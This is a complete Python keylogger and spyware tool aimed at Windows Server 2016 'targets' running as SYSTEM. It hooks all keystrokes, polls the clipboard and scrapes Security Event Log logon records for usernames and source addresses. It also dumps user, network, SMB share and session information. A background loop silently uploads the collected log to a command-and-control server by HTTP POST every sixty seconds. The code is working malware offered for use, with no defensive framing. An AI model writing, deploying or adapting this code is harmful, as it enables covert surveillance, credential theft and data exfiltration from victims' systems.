"""
Windows Logger - for use on Windows Server 2016 targets (admin/SYSTEM)
Captures: keystrokes, window titles, clipboard, Security Event Log logins,
          process snapshots — all written to a single rotating log file.

Requirements (install on target):
    pip install pywin32 pywinauto

Usage:
    python winlogger.py [output_file] [c2_ip] [c2_port] [agent_id]

    python winlogger.py                          # log only, no exfil
    python winlogger.py log.txt                  # custom log path
    python winlogger.py log.txt 10.100.1.50      # log + exfil to C2
    python winlogger.py log.txt 10.100.1.50 4444 a3f2b1c0

When C2 details are provided the log is automatically exfilled every
EXFIL_INTERVAL seconds so you don't need to manually trigger it.

Run as SYSTEM/Admin for full capability (Security event log, all sessions).
"""

import sys, os, time, threading, datetime, json, ctypes, ctypes.wintypes
import subprocess, requests

# ── Config ────────────────────────────────────────────────────────────────────

LOG_FILE       = sys.argv[1] if len(sys.argv) > 1 else "wl_out.txt"
C2_IP          = sys.argv[2] if len(sys.argv) > 2 else None
C2_PORT        = int(sys.argv[3]) if len(sys.argv) > 3 else 4444
AGENT_ID       = sys.argv[4] if len(sys.argv) > 4 else "logger"
EXFIL_INTERVAL = 60    # seconds between automatic log exfils to C2
PROC_INTERVAL  = 30    # seconds between process snapshots
CLIP_INTERVAL  = 3     # seconds between clipboard polls
EVTLOG_INTERVAL= 20    # seconds between Event Log polls

# ── Logging ───────────────────────────────────────────────────────────────────

log_lock = threading.Lock()

def write(tag, data):
    ts    = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line  = f"[{ts}] [{tag}] {data}\n"
    with log_lock:
        with open(LOG_FILE, "a", encoding="utf-8", errors="replace") as f:
            f.write(line)

# ── Keylogger (global hook via ctypes) ───────────────────────────────────────
# Uses SetWindowsHookEx with WH_KEYBOARD_LL.
# Works across all sessions when running as SYSTEM.

user32   = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

WH_KEYBOARD_LL = 13
WM_KEYDOWN     = 0x0100
WM_SYSKEYDOWN  = 0x0104

VKEY_NAMES = {
    8:  "[BACKSPACE]", 9:  "[TAB]",    13: "[ENTER]",   27: "[ESC]",
    32: "[SPACE]",     46: "[DEL]",    37: "[LEFT]",     38: "[UP]",
    39: "[RIGHT]",     40: "[DOWN]",   16: "[SHIFT]",    17: "[CTRL]",
    18: "[ALT]",       91: "[WIN]",    20: "[CAPS]",
}

_current_window = [""]
_key_buffer     = []
_key_buffer_lock = threading.Lock()

class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode",      ctypes.wintypes.DWORD),
        ("scanCode",    ctypes.wintypes.DWORD),
        ("flags",       ctypes.wintypes.DWORD),
        ("time",        ctypes.wintypes.DWORD),
        ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong)),
    ]

HOOKPROC = ctypes.CFUNCTYPE(ctypes.c_long, ctypes.c_int,
                             ctypes.wintypes.WPARAM, ctypes.wintypes.LPARAM)

def _keyboard_callback(nCode, wParam, lParam):
    if nCode >= 0 and wParam in (WM_KEYDOWN, WM_SYSKEYDOWN):
        kb   = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
        vk   = kb.vkCode
        char = VKEY_NAMES.get(vk)
        if char is None:
            # Try to get the actual character
            buf = ctypes.create_unicode_buffer(8)
            state = (ctypes.c_ubyte * 256)()
            user32.GetKeyboardState(state)
            if user32.ToUnicode(vk, kb.scanCode, state, buf, 8, 0) > 0:
                char = buf.value
            else:
                char = f"[vk{vk}]"

        # Track active window — log it when it changes
        hwnd  = user32.GetForegroundWindow()
        title = ctypes.create_unicode_buffer(256)
        user32.GetWindowTextW(hwnd, title, 256)
        win_title = title.value or "(unknown)"

        with _key_buffer_lock:
            if win_title != _current_window[0]:
                _current_window[0] = win_title
                _key_buffer.append(f"\n--- Window: {win_title} ---\n")
            _key_buffer.append(char)

        # Flush buffer to log every 50 chars
        with _key_buffer_lock:
            if len(_key_buffer) >= 50:
                write("KEYS", "".join(_key_buffer))
                _key_buffer.clear()

    return user32.CallNextHookEx(None, nCode, wParam, lParam)

def run_keylogger():
    callback = HOOKPROC(_keyboard_callback)
    hook     = user32.SetWindowsHookExW(WH_KEYBOARD_LL, callback, None, 0)
    if not hook:
        write("ERROR", "Failed to install keyboard hook (need SYSTEM?)")
        return
    write("INFO", "Keyboard hook installed")
    msg = ctypes.wintypes.MSG()
    while user32.GetMessageW(ctypes.byref(msg), None, 0, 0) != 0:
        user32.TranslateMessage(ctypes.byref(msg))
        user32.DispatchMessageW(ctypes.byref(msg))
    user32.UnhookWindowsHookEx(hook)

# ── Clipboard monitor ─────────────────────────────────────────────────────────

def run_clipboard_monitor():
    last = ""
    while True:
        try:
            # Use powershell to read clipboard — avoids OpenClipboard locking issues
            result = subprocess.run(
                ["powershell", "-Command", "Get-Clipboard"],
                capture_output=True, text=True, timeout=5
            )
            content = result.stdout.strip()
            if content and content != last:
                last = content
                write("CLIP", content[:500])   # cap at 500 chars
        except Exception:
            pass
        time.sleep(CLIP_INTERVAL)

# ── Security Event Log scraper ────────────────────────────────────────────────
# Event IDs:
#   4624 - Successful logon
#   4625 - Failed logon (wrong password attempts — often contains username)
#   4648 - Logon with explicit credentials (runas, pass-the-hash attempts)

INTERESTING_EVENTS = {
    4624: "LOGON_SUCCESS",
    4625: "LOGON_FAILURE",
    4648: "EXPLICIT_CREDS",
}

def run_event_log_scraper():
    """
    Uses wevtutil to pull recent Security log entries for login events.
    Parses out username, domain, source IP, logon type.
    """
    seen_records = set()

    def scrape():
        for event_id, label in INTERESTING_EVENTS.items():
            try:
                query = (
                    f"wevtutil qe Security "
                    f"/q:\"*[System[EventID={event_id}]]\" "
                    f"/c:20 /rd:true /f:text"
                )
                result = subprocess.run(
                    query, shell=True, capture_output=True,
                    text=True, timeout=10
                )
                if result.returncode != 0:
                    continue

                # Parse the text output into chunks per event
                blocks = result.stdout.strip().split("\n\n")
                for block in blocks:
                    if not block.strip():
                        continue
                    # Deduplicate by first 120 chars
                    key = block[:120]
                    if key in seen_records:
                        continue
                    seen_records.add(key)

                    # Pull interesting fields
                    fields = {}
                    for line in block.splitlines():
                        line = line.strip()
                        for field in ["Account Name", "Account Domain",
                                      "Source Network Address", "Logon Type",
                                      "Failure Reason", "Workstation Name"]:
                            if line.startswith(field + ":"):
                                fields[field] = line.split(":", 1)[1].strip()

                    if fields:
                        summary = " | ".join(f"{k}={v}" for k, v in fields.items())
                        write(label, summary)

            except Exception as e:
                write("ERROR", f"Event log scrape failed for {event_id}: {e}")

    while True:
        scrape()
        time.sleep(EVTLOG_INTERVAL)

# ── Process snapshot ──────────────────────────────────────────────────────────

def run_process_snapshots():
    last_procs = set()
    while True:
        try:
            result = subprocess.run(
                ["tasklist", "/fo", "csv", "/nh"],
                capture_output=True, text=True, timeout=10
            )
            current = set()
            for line in result.stdout.strip().splitlines():
                parts = line.strip('"').split('","')
                if parts:
                    current.add(parts[0])   # process name

            new_procs  = current - last_procs
            dead_procs = last_procs - current

            if new_procs:
                write("PROC_NEW",  ", ".join(sorted(new_procs)))
            if dead_procs and last_procs:   # skip first run
                write("PROC_DEAD", ", ".join(sorted(dead_procs)))

            last_procs = current
        except Exception as e:
            write("ERROR", f"Process snapshot failed: {e}")

        time.sleep(PROC_INTERVAL)

# ── C2 exfil loop ─────────────────────────────────────────────────────────────

def run_exfil_loop():
    if not C2_IP:
        return
    base_url = f"http://{C2_IP}:{C2_PORT}"
    while True:
        time.sleep(EXFIL_INTERVAL)
        try:
            if not os.path.isfile(LOG_FILE):
                continue
            with open(LOG_FILE, "rb") as f:
                data = f.read()
            requests.post(
                f"{base_url}/upload/{AGENT_ID}",
                params={"name": os.path.basename(LOG_FILE)},
                data=data,
                timeout=15,
            )
        except Exception:
            pass   # silently retry next cycle

# ── Startup info dump ─────────────────────────────────────────────────────────

def dump_startup_info():
    write("INFO", f"Logger started. PID={os.getpid()} File={LOG_FILE}")

    # Current user / privilege
    try:
        r = subprocess.run(["whoami", "/all"], capture_output=True, text=True, timeout=5)
        write("WHOAMI", r.stdout.strip()[:800])
    except Exception:
        pass

    # Network config — useful for understanding what SMB shares are visible
    try:
        r = subprocess.run(["ipconfig", "/all"], capture_output=True, text=True, timeout=5)
        write("IPCONFIG", r.stdout.strip()[:800])
    except Exception:
        pass

    # Enumerate SMB shares on this box
    try:
        r = subprocess.run(["net", "share"], capture_output=True, text=True, timeout=5)
        write("SMB_SHARES", r.stdout.strip())
    except Exception:
        pass

    # Logged-on users
    try:
        r = subprocess.run(["query", "user"], capture_output=True, text=True, timeout=5)
        write("LOGGED_ON_USERS", r.stdout.strip())
    except Exception:
        pass

# ── Main ──────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    dump_startup_info()

    threads = [
        threading.Thread(target=run_clipboard_monitor,  daemon=True),
        threading.Thread(target=run_event_log_scraper,  daemon=True),
        threading.Thread(target=run_process_snapshots,  daemon=True),
        threading.Thread(target=run_exfil_loop,         daemon=True),
    ]
    for t in threads:
        t.start()

    # Keylogger runs on the main thread (message loop requirement)
    write("INFO", "Starting keyboard hook on main thread...")
    run_keylogger()